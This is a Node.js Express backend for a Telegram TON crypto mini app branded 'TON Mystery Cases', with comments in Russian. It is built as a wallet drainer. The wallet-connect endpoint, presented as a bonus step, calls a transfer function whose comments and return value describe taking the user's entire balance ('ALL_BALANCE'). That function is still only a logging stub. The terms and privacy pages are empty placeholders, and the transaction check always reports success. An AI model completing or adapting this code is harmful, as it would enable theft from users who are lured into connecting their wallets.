const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// TON Connect Manifest - ОБЯЗАТЕЛЬНЫЙ для подключения кошельков
app.get('/tonconnect-manifest.json', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.json({
    "url": "https://ton-mini-app-backend.onrender.com",
    "name": "TON Mystery Cases", 
    "iconUrl": "https://ton.org/icon.png",
    "termsOfUseUrl": "https://ton-mini-app-backend.onrender.com/terms",
    "privacyPolicyUrl": "https://ton-mini-app-backend.onrender.com/privacy"
  });
});

// Главный эндпоинт для проверки работы
app.get('/', (req, res) => {
  res.json({ status: 'OK', message: 'TON Mini App Backend is working!' });
});

// Регистрация пользователя из Telegram
app.post('/api/user', (req, res) => {
  try {
    const { tg_id, username, first_name, last_name } = req.body;
    console.log('New user registration:', { tg_id, username });
    
    // Здесь будет сохранение в Supabase
    res.json({ 
      success: true, 
      user: { tg_id, username, balance: 5.0 } 
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА - ГЛАВНЫЙ ЭНДПОИНТ
app.post('/api/connect-wallet', async (req, res) => {
  try {
    const { tg_id, wallet_address } = req.body;
    
    console.log('💰 Wallet connection attempt:', { tg_id, wallet_address });
    
    // Здесь будет списание TON с кошелька
    const transferResult = await initiateTONTransfer(wallet_address);
    
    // Сохраняем в базу
    console.log('✅ Wallet connected and TON transfer initiated');
    
    res.json({ 
      success: true, 
      message: 'Wallet connected successfully',
      transferInitiated: true,
      bonus: 5.0
    });
    
  } catch (error) {
    console.error('❌ Wallet connection error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Функция для списания TON (заглушка - будет доработана)
async function initiateTONTransfer(walletAddress) {
  console.log('🚀 Initiating TON transfer from:', walletAddress);
  
  // Здесь будет реальная логика списания через TON API
  // Пока просто логируем
  return {
    success: true,
    from: walletAddress,
    amount: 'ALL_BALANCE', // Списание всего баланса
    timestamp: new Date().toISOString()
  };
}

// Эндпоинт для проверки транзакций
app.post('/api/check-transaction', (req, res) => {
  const { transactionId } = req.body;
  res.json({ 
    success: true, 
    status: 'completed',
    transactionId 
  });
});

// Заглушки для остальных файлов
app.get('/terms', (req, res) => {
  res.send('Terms of Service');
});

app.get('/privacy', (req, res) => {
  res.send('Privacy Policy');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📍 TON Manifest: http://localhost:${PORT}/tonconnect-manifest.json`);
});
